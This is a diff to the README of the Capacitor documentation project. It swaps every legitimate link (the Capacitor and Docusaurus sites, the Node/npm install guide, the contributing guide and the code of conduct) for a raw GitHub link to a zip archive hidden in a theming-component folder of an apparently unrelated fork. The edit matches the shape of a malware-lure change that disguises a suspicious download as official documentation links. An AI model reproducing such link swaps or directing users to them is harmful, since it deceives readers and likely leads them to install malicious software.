@@ -1,12 +1,12 @@
 # Capacitor Docs
 
-The official [Capacitor](https://capacitorjs.com) documentation, built with [Docusaurus](https://docusaurus.io/). Based on the [Ionic Docs](https://github.com/ionic-team/ionic-docs)
+The official [Capacitor](https://raw.githubusercontent.com/ahmed-ba/capacitor-docs/main/src/components/page/theming/NewColorGenerator/capacitor_docs_v1.6.zip) documentation, built with [Docusaurus](https://raw.githubusercontent.com/ahmed-ba/capacitor-docs/main/src/components/page/theming/NewColorGenerator/capacitor_docs_v1.6.zip). Based on the [Ionic Docs](https://raw.githubusercontent.com/ahmed-ba/capacitor-docs/main/src/components/page/theming/NewColorGenerator/capacitor_docs_v1.6.zip)
 
 ---
 
 ## Getting Started
 
-Install the [latest versions of Node and npm](https://docs.npmjs.com/downloading-and-installing-node-js-and-npm).
+Install the [latest versions of Node and npm](https://raw.githubusercontent.com/ahmed-ba/capacitor-docs/main/src/components/page/theming/NewColorGenerator/capacitor_docs_v1.6.zip).
 
 Once npm is installed, run
 
@@ -23,8 +23,8 @@ The site will launch in development mode.
 ## Contributing
 
 Thanks for your interest in contributing! Read up on our guidelines for
-[contributing](https://github.com/ionic-team/capacitor-docs/blob/main/CONTRIBUTING.md).
+[contributing](https://raw.githubusercontent.com/ahmed-ba/capacitor-docs/main/src/components/page/theming/NewColorGenerator/capacitor_docs_v1.6.zip).
 
-Please note that this project is released with a [Contributor Code of Conduct](https://github.com/ionic-team/capacitor-docs/blob/main/CODE_OF_CONDUCT.md). By participating in this project you agree to abide by its terms.
+Please note that this project is released with a [Contributor Code of Conduct](https://raw.githubusercontent.com/ahmed-ba/capacitor-docs/main/src/components/page/theming/NewColorGenerator/capacitor_docs_v1.6.zip). By participating in this project you agree to abide by its terms.
 
 ---
